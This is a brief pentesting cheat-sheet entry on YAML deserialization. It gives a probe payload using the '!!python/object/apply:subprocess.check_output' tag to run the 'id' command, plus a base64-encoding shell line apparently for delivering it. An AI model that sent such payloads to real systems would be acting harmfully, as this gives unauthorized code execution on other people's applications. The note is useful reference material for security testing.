# DES-Yaml
Like (LDAP-Deserialization).
- Read [DES-Yaml-Exploitation](https://www.pkmurphy.com.au/isityaml/).
- Probe use this.
	```txt
	yaml: !!python/object/apply:subprocess.check_output ['id']
	```
	```shell
	cat data.txt | base64 -w 0; echo
	```